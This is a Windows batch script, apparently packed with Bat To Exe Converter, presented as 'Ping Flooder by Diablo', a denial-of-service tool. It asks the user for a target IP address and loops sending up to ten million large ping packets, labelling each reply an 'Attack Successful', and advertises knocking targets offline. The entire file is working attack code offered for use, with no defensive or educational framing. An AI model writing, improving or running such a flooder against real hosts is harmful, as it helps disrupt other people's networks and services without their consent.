::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBhcXg2RAE+1EbsQ5+n//NaDq0wfWO09d4DPlL2NL4A=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBhcXg2RAE+/Fb4I5/jH3+OJpQ07WO0wfIrJmraXYMQa60foetYbgjQJ1p9MKhJWfx7laxcxyQ==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

REM Change the current directory to the directory containing your script
set "SCRIPT_DIR=%~dp0"
cd /d "%SCRIPT_DIR%"

title Ping Flooder by Diablo V4.3.4 Final


REM Set the batch file to read-only
attrib +R "Ping Flooder by Diablo V4.3.4 Final.bat"

echo Ping Flooder by Diablo V4.3.4 Final
echo Historical .BAT File Ping Flooder, Hitting them offline since 2004!

REM Prompt user to enter IP address to target
set /p ip=Enter the IP address:

REM begin
:begin

echo Launching the Attack!

REM Loop to perform ping flood attack
setlocal enabledelayedexpansion
set count=0
set maxCount=10000000

:loop
if !count! equ %maxCount% goto timeout

REM Perform ping command and check for reply
ping -n 1 -l 1472 -w 100 %ip% | findstr /c:"Reply from" >nul
if !errorlevel! equ 0 (
    echo Attack on %ip% Successful!
) else (
    echo Attempted Attack on %ip% Failed!
)

REM Increment count and display progress
set /a count+=1
echo (Count: !count!)
goto loop

:timeout
echo Attack timed out.
timeout /t 3 >nul

REM Repeat to begin
goto begin